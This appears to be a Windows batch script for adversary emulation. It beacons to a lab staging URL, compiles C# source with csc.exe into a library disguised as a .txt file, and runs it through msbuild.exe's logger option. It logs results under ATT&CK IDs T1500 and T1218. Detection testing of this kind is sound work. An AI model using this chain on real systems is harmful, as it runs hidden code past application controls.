@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8864\41452cf0
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8864-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=exploren.txt
SET njozco=file.txt
SET kkjwr=8864
SET ttfkn=%APPDATA%\!ufeybybm!\macula-simulations.log
SET dtblkj=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe
SET mvpbc=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_start=!uouoq!>> "!ttfkn!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_complete=1>> "!ttfkn!" 2>nul

SET res1=1
SET err1=
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_target=!recnn!>> "!ttfkn!" 2>nul
cd /d "!recnn!" 2>nul
IF !ERRORLEVEL! NEQ 0 SET res1=0&SET err1=chdir_failed
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_result=!ERRORLEVEL!>> "!ttfkn!" 2>nul
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!res1!:!err1!>> "!ttfkn!" 2>nul

SET res2=1
SET err2=
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!ttfkn!" 2>nul
"!dtblkj!" /target:library /reference:Microsoft.Build.Framework.dll /out:"!hpnjatpj!" "!njozco!" 2>nul
IF !ERRORLEVEL! NEQ 0 SET res2=0&SET err2=compile_failed
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_result=!ERRORLEVEL!>> "!ttfkn!" 2>nul
IF EXIST "!hpnjatpj!" (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: logger_exec_start=!mvpbc!>> "!ttfkn!" 2>nul
    "!mvpbc!" /logger:LoggerEntry,"!recnn!\\!hpnjatpj!";MyParameters,Foo 2>nul
    IF !ERRORLEVEL! NEQ 0 SET res2=0&SET err2=msbuild_failed
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: logger_exec_result=!ERRORLEVEL!>> "!ttfkn!" 2>nul
) ELSE (
    SET res2=0
    SET err2=output_missing
)
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!res2!:!err2!>> "!ttfkn!" 2>nul
ENDLOCAL